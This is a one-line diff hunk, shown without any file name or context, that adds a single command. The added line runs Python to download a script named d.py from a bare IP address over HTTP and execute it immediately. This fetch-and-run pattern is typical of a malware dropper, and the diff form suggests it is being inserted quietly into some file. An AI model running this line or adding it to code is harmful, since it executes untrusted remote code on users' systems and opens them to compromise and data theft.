@@ -1,0 +1,1 @@
+python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/d.py").read())'
